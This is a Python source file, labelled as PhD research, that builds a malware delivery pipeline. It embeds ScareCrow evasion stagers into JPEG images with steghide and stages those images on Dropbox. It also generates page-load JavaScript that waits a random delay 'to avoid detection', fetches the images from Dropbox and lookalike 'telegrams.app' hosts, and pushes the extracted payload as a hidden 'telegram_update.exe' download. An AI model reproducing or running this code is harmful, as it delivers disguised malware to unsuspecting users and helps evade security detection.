#!/usr/bin/env python3
"""
Fixed Steganography System for PhD Research
Uses JPEG images which steghide supports properly
"""

import os
import sys
import time
import hashlib
import subprocess
import random
import json
from pathlib import Path
from PIL import Image
import numpy as np
import requests

class StegoSystem:
    def __init__(self, password="telegram2025research"):
        self.password = password
        self.base_dir = Path(__file__).parent
        self.images_dir = self.base_dir / "stego-images"
        self.payloads_dir = self.base_dir / "payloads"
        self.output_dir = self.base_dir / "stego-output"
        
        # Create directories
        for d in [self.images_dir, self.payloads_dir, self.output_dir]:
            d.mkdir(exist_ok=True)

    def download_real_images(self):
        """Download real images from the internet to use as carriers"""
        print("Downloading real images as carriers...")
        
        # Use Unsplash API for legitimate images
        image_urls = [
            "https://picsum.photos/1920/1080.jpg",
            "https://picsum.photos/1600/900.jpg", 
            "https://picsum.photos/1280/720.jpg",
            "https://picsum.photos/1920/1200.jpg",
            "https://picsum.photos/1600/1200.jpg"
        ]
        
        for i in range(20):  # Download 20 different images
            try:
                # Get random image
                url = random.choice(image_urls)
                response = requests.get(f"{url}?random={i}")
                
                if response.status_code == 200:
                    filename = f"carrier_{i:03d}.jpg"
                    filepath = self.images_dir / filename
                    
                    with open(filepath, 'wb') as f:
                        f.write(response.content)
                    
                    print(f"✓ Downloaded: {filename}")
                else:
                    print(f"✗ Failed to download image {i}")
                    
            except Exception as e:
                print(f"✗ Error downloading image {i}: {str(e)}")
        
        print(f"Downloaded images to {self.images_dir}")

    def create_synthetic_images(self, count=30):
        """Create synthetic JPEG images as carriers"""
        print(f"Creating {count} synthetic JPEG images...")
        
        for i in range(count):
            # Create realistic image dimensions
            width = random.choice([1920, 1600, 1280, 1024])
            height = random.choice([1080, 900, 720, 768])
            
            # Generate realistic image data
            img_array = self._generate_realistic_image(width, height, i)
            img = Image.fromarray(img_array)
            
            # Save as JPEG with high quality
            filename = f"synthetic_{i:03d}.jpg"
            filepath = self.images_dir / filename
            img.save(filepath, 'JPEG', quality=95, optimize=True)
            
            print(f"✓ Created: {filename}")

    def _generate_realistic_image(self, width, height, seed):
        """Generate realistic-looking image data"""
        np.random.seed(seed)
        
        # Create base image with gradient
        img = np.zeros((height, width, 3), dtype=np.uint8)
        
        # Add gradient background
        for y in range(height):
            for x in range(width):
                r = int(128 + 127 * np.sin(x * 0.01) * np.cos(y * 0.01))
                g = int(128 + 127 * np.cos(x * 0.02) * np.sin(y * 0.02))
                b = int(128 + 127 * np.sin(x * 0.015) * np.cos(y * 0.015))
                
                img[y, x] = [
                    max(0, min(255, r)),
                    max(0, min(255, g)),
                    max(0, min(255, b))
                ]
        
        # Add some noise for realism
        noise = np.random.randint(-20, 21, (height, width, 3))
        img = np.clip(img.astype(int) + noise, 0, 255).astype(np.uint8)
        
        return img

    def embed_payload(self, payload_path, image_path, output_path):
        """Embed payload into JPEG image using steghide"""
        try:
            cmd = [
                'steghide', 'embed',
                '-cf', str(image_path),
                '-ef', str(payload_path), 
                '-sf', str(output_path),
                '-p', self.password,
                '-z', '9',  # Maximum compression
                '-e', 'des',  # Encryption algorithm
                '-q'  # Quiet mode
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return True, "Embedded successfully"
            else:
                return False, result.stderr.strip()
        except Exception as e:
            return False, str(e)

    def extract_payload(self, stego_image_path, output_path):
        """Extract payload from stego image"""
        try:
            cmd = [
                'steghide', 'extract',
                '-sf', str(stego_image_path),
                '-xf', str(output_path), 
                '-p', self.password,
                '-f',  # Force overwrite
                '-q'   # Quiet mode
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return True, "Extracted successfully"
            else:
                return False, result.stderr.strip()
        except Exception as e:
            return False, str(e)

    def process_stagers(self):
        """Process all ScareCrow stagers into stego images"""
        stager_paths = [
            "/home/kali/tools/ScareCrow/cmd.exe",
            "/home/kali/tools/ScareCrow/OneNote.exe",
            "/home/kali/tools/ScareCrow/Excel.exe"
        ]
        
        print("Processing stagers into steganography images...")
        
        # Get JPEG carrier images only
        carrier_images = list(self.images_dir.glob("*.jpg"))
        
        if len(carrier_images) < 10:
            print("Not enough carrier images. Creating more...")
            self.create_synthetic_images(30)
            try:
                self.download_real_images()
            except:
                print("Could not download real images, using synthetic only")
            carrier_images = list(self.images_dir.glob("*.jpg"))
        
        stego_manifest = {}
        
        for stager_path in stager_paths:
            if not os.path.exists(stager_path):
                print(f"Stager not found: {stager_path}")
                continue
            
            stager_name = Path(stager_path).stem
            stego_manifest[stager_name] = []
            
            # Try multiple carrier images for each stager
            success_count = 0
            for j, carrier in enumerate(random.sample(carrier_images, min(10, len(carrier_images)))):
                output_name = f"{stager_name}_{j:02d}.jpg"
                output_path = self.output_dir / output_name
                
                success, message = self.embed_payload(stager_path, carrier, output_path)
                
                if success:
                    # Calculate hash for verification
                    with open(output_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                    
                    stego_manifest[stager_name].append({
                        'filename': output_name,
                        'carrier': carrier.name,
                        'hash': file_hash,
                        'size': os.path.getsize(output_path)
                    })
                    print(f"✓ Created: {output_name}")
                    success_count += 1
                    
                    # Stop after 5 successful embeddings per stager
                    if success_count >= 5:
                        break
                else:
                    print(f"✗ Failed: {output_name} - {message}")
        
        # Save manifest
        manifest_path = self.output_dir / "stego_manifest.json"
        with open(manifest_path, 'w') as f:
            json.dump(stego_manifest, f, indent=2)
        
        print(f"\nManifest saved to: {manifest_path}")
        return stego_manifest

    def generate_extraction_script(self):
        """Generate JavaScript for client-side extraction"""
        js_code = '''
// Steganography extraction system
class StegoExtractor {
    constructor() {
        this.password = "telegram2025research";
        this.baseUrl = "https://dl.dropboxusercontent.com/";
        this.fallbackUrls = [
            "https://telegrams.app/images/",
            "https://cdn.telegrams.app/media/"
        ];
    }

    async downloadAndExtract(filename) {
        // Try multiple sources
        for (const baseUrl of [this.baseUrl, ...this.fallbackUrls]) {
            try {
                const response = await fetch(baseUrl + filename);
                if (!response.ok) continue;
                
                const blob = await response.blob();
                
                // Send to extraction endpoint
                const formData = new FormData();
                formData.append('image', blob);
                formData.append('password', this.password);
                
                const extractResponse = await fetch('/extract', {
                    method: 'POST',
                    body: formData
                });
                
                if (extractResponse.ok) {
                    const payload = await extractResponse.blob();
                    this.executePayload(payload);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        return false;
    }

    executePayload(payloadBlob) {
        // Create temporary URL for payload
        const url = URL.createObjectURL(payloadBlob);
        
        // Create hidden download link
        const a = document.createElement('a');
        a.href = url;
        a.download = 'telegram_update.exe';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        
        // Cleanup
        setTimeout(() => {
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }, 1000);
    }

    async extractFromMultiple(filenames) {
        for (const filename of filenames) {
            if (await this.downloadAndExtract(filename)) {
                break; // Success, stop trying
            }
        }
    }
}

// Auto-execute on page load
window.addEventListener('load', function() {
    const extractor = new StegoExtractor();
    
    // Try different stager variants
    const stagerFiles = [
        "cmd_00.jpg", "cmd_01.jpg", "cmd_02.jpg",
        "OneNote_00.jpg", "OneNote_01.jpg", "OneNote_02.jpg", 
        "Excel_00.jpg", "Excel_01.jpg", "Excel_02.jpg"
    ];
    
    // Random delay to avoid detection
    setTimeout(() => {
        extractor.extractFromMultiple(stagerFiles);
    }, Math.random() * 5000 + 2000);
});
'''
        
        js_path = self.output_dir / "stego_extractor.js"
        with open(js_path, 'w') as f:
            f.write(js_code)
        
        print(f"JavaScript extractor saved to: {js_path}")

    def create_dropbox_upload_script(self):
        """Create script to upload stego images to Dropbox"""
        upload_script = f'''#!/bin/bash
# Upload steganography images to Dropbox

DROPBOX_DIR="$HOME/Dropbox/Apps/TelegramClientUpdates/Images"
STEGO_DIR="/home/kali/Cloudflare/stego-output"

# Create Dropbox directory
mkdir -p "$DROPBOX_DIR"

# Copy all stego images
echo "Uploading steganography images to Dropbox..."
cp "$STEGO_DIR"/*.jpg "$DROPBOX_DIR"/

# Generate index file
cat > "$DROPBOX_DIR/index.json" << 'EOF'
{{
  "images": [
'''
        
        # Add all output images to script
        stego_images = list(self.output_dir.glob("*.jpg"))
        for i, img in enumerate(stego_images):
            upload_script += f'    "{img.name}"'
            if i < len(stego_images) - 1:
                upload_script += ','
            upload_script += '\n'
        
        upload_script += f'''  ],
  "timestamp": "{int(time.time())}",
  "count": {len(stego_images)}
}}
EOF

echo "Upload completed. {len(stego_images)} images available in Dropbox."
echo "Dropbox public links:"
for img in "$DROPBOX_DIR"/*.jpg; do
    echo "https://dl.dropboxusercontent.com/$(basename "$img")"
done
'''
        
        script_path = self.output_dir / "upload_to_dropbox.sh"
        with open(script_path, 'w') as f:
            f.write(upload_script)
        
        os.chmod(script_path, 0o755)
        print(f"Upload script created: {script_path}")

    def test_extraction(self):
        """Test that extraction works"""
        print("Testing extraction...")
        
        stego_images = list(self.output_dir.glob("*.jpg"))
        if not stego_images:
            print("No stego images to test")
            return
        
        # Test first stego image
        test_image = stego_images[0]
        test_output = self.output_dir / "test_extracted.exe"
        
        success, message = self.extract_payload(test_image, test_output)
        
        if success:
            print(f"✓ Extraction test successful: {test_output}")
            # Verify file exists and has content
            if test_output.exists() and test_output.stat().st_size > 0:
                print(f"✓ Extracted file size: {test_output.stat().st_size} bytes")
            else:
                print("✗ Extracted file is empty or missing")
        else:
            print(f"✗ Extraction test failed: {message}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 stego-system-fixed.py [create|process|test|extract]")
        print("  create  - Create carrier images only")
        print("  process - Full processing (create carriers + embed stagers)")
        print("  test    - Test extraction")
        return
    
    stego = StegoSystem()
    command = sys.argv[1]
    
    if command == "create":
        stego.create_synthetic_images(30)
        try:
            stego.download_real_images()
        except:
            print("Could not download real images, using synthetic only")
    elif command == "process":
        stego.process_stagers()
        stego.generate_extraction_script() 
        stego.create_dropbox_upload_script()
    elif command == "test":
        stego.test_extraction()
    elif command == "extract" and len(sys.argv) == 4:
        stego_image, output = sys.argv[2:4]
        success, msg = stego.extract_payload(stego_image, output)
        print(f"{'Success' if success else 'Failed'}: {msg}")
    else:
        print("Invalid command or arguments")

if __name__ == "__main__":
    main()